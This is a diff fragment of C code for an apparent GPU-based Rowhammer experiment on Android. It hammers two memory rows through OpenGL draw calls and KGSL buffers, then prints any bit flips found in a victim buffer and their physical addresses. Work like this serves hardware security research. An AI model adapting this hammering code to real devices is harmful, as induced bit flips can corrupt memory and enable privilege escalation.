@@ -603,7 +603,7 @@ int main()
 	glDeleteShader(fragmentShader);
 	glDeleteShader(vertexShader);
 	int bitflips = 0;
-	for (size_t i = 3; i < cont_kgsls; ++i)
+	for (size_t i = 0; i < cont_kgsls; ++i)
 	{
 		// preparing program to run
 		struct kgsl_entry *evictarr[15];
@@ -638,13 +638,14 @@ int main()
 			currr = currr->kgsl_next;
 		}
 
-		for (int k = 10; k < 28; k += 1)
+		for (int k = 0; k < 28; k += 1)
 		{
 			// Hammering two rows...
 			GLuint group[2];
 			GLuint counter[3];
 			GLuint monitor;
 			GLuint *counterData;
+			struct kgsl_entry* kgsltmp = row1;
 			GLuint row1TexLocation, row2TexLocation;
 			unsigned int resultSize;
 			GLuint evictionTexLocation;
@@ -660,7 +661,7 @@ int main()
 			for(int j = 0; j < 2; j += 4){for(int k2 = 0; k2 < 2; k2 += 4){
 			glGenVertexArrays(1, &VAO);
 			glGenBuffers(1, &VBO);	
-
+			printf("ROW1:%p ; VICTIM: %p; ROW2: %p\n", row1->kgsl_pa, victim->kgsl_pa, row2->kgsl_pa);
 			glBindVertexArray(VAO);
 
 			glBindBuffer(GL_ARRAY_BUFFER, VBO);
@@ -785,10 +786,16 @@ int main()
 			glClear(GL_COLOR_BUFFER_BIT);
 
 			glBindVertexArray(VAO);
+			glFlush();
 			clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &time1);
-			glDrawArrays(GL_POINTS, 0, 1);
-			clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &time2);
+//			glDrawArrays(GL_POINTS, 0, 1);
+			glDrawElements(GL_POINTS, 1, GL_UNSIGNED_BYTE, threadID);
+			//for(uint64_t bflips = 0; bflips < 4000000; ++bflips){
+			//	*(volatile char*)row1->kgsl_va = 0x0;
+			//	*(volatile char*)row2->kgsl_va = 0x0;
+			//}
 			glEndPerfMonitorAMD(monitor);
+			clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &time2);
 			printf("MY TIMER RESULT %lu:%lu\n", diff(time1,time2).tv_sec, diff(time1,time2).tv_nsec);
 			//usleep(1000);
 			glGetPerfMonitorCounterDataAMD(monitor, GL_PERFMON_RESULT_SIZE_AMD, sizeof(GLint), (GLuint *)&resultSize, NULL);
@@ -842,16 +849,19 @@ int main()
 					for (int j = 0; j < 32; ++j)
 					{
 						if (frame2[i * 32 + j] != 0xffffffff && frame2[i * 32 + j] != 0)
-							printf("< ========================== > FOUND BITFLIP %x on position %d\n", frame2[i * 32 + j], i * 32 + j, bitflips++);
+							printf("< ========================== > FOUND BITFLIP %x on position %d; va - %p; row1:%p, row2:%p, victim:%p\n", frame2[i * 32 + j], i * 32 + j,  victim->kgsl_pa,  row1->kgsl_pa, row2->kgsl_pa, victim->kgsl_pa);
 					}
 				}
+				row1 = row1->kgsl_next;
+				row2 = row2->kgsl_next;
 				victim = victim->kgsl_next;
+				++bitflips;
 			}
 			glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, tex, 0);
 			}}; // int j = 0, k = 0... 
 		next_iter:
 			free(frame2);
-			row1 = row1->kgsl_next;
+			row1 = kgsltmp->kgsl_next;
 			victim = row1;
 			for (int j = 0; j < 16; ++j)
 			{
